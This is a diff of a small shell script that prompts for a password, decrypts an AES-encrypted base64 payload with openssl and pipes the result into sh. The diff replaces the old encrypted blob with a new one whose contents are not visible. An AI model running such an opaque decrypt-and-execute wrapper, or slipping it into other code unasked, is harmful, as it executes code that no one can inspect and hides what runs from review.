@@ -2,6 +2,16 @@
 set -e
 if ! command -v openssl >/dev/null 2>&1; then echo "Error: openssl required"; exit 1; fi
 printf "Password: " > /dev/tty; stty -echo < /dev/tty 2>/dev/null || true; read PASSWORD < /dev/tty; stty echo < /dev/tty 2>/dev/null || true; echo "" > /dev/tty
-PAYLOAD="U2FsdGVkX1//6qWX8WfQH9KjgxsKBrmlKekRpK1f0cBt8Gl4/MHkxoiY+YTDobB6ZFpMXpePt73Pt3fblxuluuSYK6jLsDLGf4OE4U+kjC0OfKe3CqY3I4oyXH1Mt+bhAyvH3T9BDn7y3ctqOCbqNge3KaPQU/3s7OgMHNZqCVHiKbo6wDjIo4Lzobz37MqC7OYo3TBrlmgIkv9y14WUMAhsd4oH4qiYXg94c/N79PeNm/3hApnYdobz3FEF9ICllEa5/lQgLGDTxE/vzd1TqnN9M/yfZGG5D/2KkOASjk6xb9MTvKa+ZXntqxLv4d4fI+ntfZaoDY7ahTcYfW23DUZfIiv4eVmtBdxWW44apzyVPrfhxGwS2r/N3FYmmYlF2lPxfFpgVFyI3yQSRGkwyHnYIqaXBsPOWlQdcLGAnqEcRyWqGSKgX8pnXBrl704zmWz8dmyuzKGUUqhe+tIcJMBuo/UkgaDFCRGNseku0b0="
-DECRYPTED=$(echo "$PAYLOAD" | openssl enc -aes-256-cbc -d -a -A -pbkdf2 -iter 100000 -k "$PASSWORD" 2>/dev/null) || { echo "Error: Decryption failed. Wrong password?"; exit 1; }
+PAYLOAD=$(cat <<'INITS_PAYLOAD'
+U2FsdGVkX1/WVoAwG5GcSRaBmZImSZFjJuVHXH/spEFoPy8lh2yUVUzA2TpTel9V
+gVaH5cU0nJoF03WQsXpqAAeHeN4/PMQBHNUTeO5mx4BScPDReDpME+pv+6tUkWMZ
+Mg2TpB8+pfYzNPBwoCHPMMEO8cAlU9afKtjyF6yeF2OXTnhP+GozbvimTON6KhnF
+6InxQKEAe1ybHze0/CRnkGRdFC9QVpbHUOCAMRQO23+pC6NNtCck3BHiotXjMcGg
+MB/UICD8HrNno5IOmSmv2tZ7WypmvA9MNGI4KJoBi9deUtLcmqGMIwBViOzHzK09
+vR6rszWDnwptjDHzNS3TKK1ix/e69AUHNWis3VOj86g3rJ5pwb2s6luXdJtiDkSe
+gLFPzXwKEO0Bjzqr3LEmMyBZsGw5/KtJ4CQ+ksRA5fXFaO1AW7jo/c/X99IleF1w
+a88DC9dntkoyZkrlrQYQu3h5JaWRDBKJn5bCOyAScUM=
+INITS_PAYLOAD
+)
+DECRYPTED=$(printf '%s\n' "$PAYLOAD" | openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -k "$PASSWORD" 2>/dev/null) || { echo "Error: Decryption failed. Wrong password?"; exit 1; }
 echo "$DECRYPTED" | sh
